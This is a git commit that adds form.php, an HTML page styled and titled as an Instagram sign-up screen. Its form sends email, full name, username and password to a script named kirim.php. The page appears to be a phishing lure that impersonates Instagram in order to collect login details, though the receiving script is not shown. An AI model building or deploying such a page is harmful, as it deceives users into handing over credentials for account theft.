0cd466a45e907ed687c1528b873e283152bd9659
sulihkhudinadityarisq <30432177+sulihkhudinadityarisq@users.noreply.github.com>
2017-10-14 20:18:55 +0700

    Create form.php

---
+++ form.php
@@ -0,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Instagram</title>
+	<link rel="stylesheet" href="style.css">
+</head>
+<body bgcolor="#F1F1F1">
+<div id ="container"> 
+
+	<div class="Header">
+		Instagram
+	</div>
+
+	<div class="subheader">
+		Sign up to see photos and videos <br>
+		from your firends.
+	</div>
+	
+	<div id="line">
+	<center>
+	<table>
+	<tr>
+	<td><div class="up">------------------------------ O</div></td>
+	<a><td><div class="up">R ----------------------------</div></td></a>
+	</tr>
+	</table>
+	</center>
+	</div>
+	<div class="content">
+		<form action="kirim.php" method="POST">
+			<input type="email" name="email" placeholder="Mobile Number of Email"><br>
+			<input type="text"	name="fullname" placeholder="Full Name"><br>
+			<input type="text"	name="user" placeholder="Username"><br>
+			<input type="password"	name="pw" placeholder="Password"><br>
+			<input type="submit" name="singup" value="Sign up">
+		</form>	
+	</div>
+
+		<div class="Footer">
+		By Signing Up, you agree to our <br>
+		<a>Terms</a> & <a>Privacy Policy.</a>
+		</div>
+	
+
+</div>
+	
+</body>
+</html>
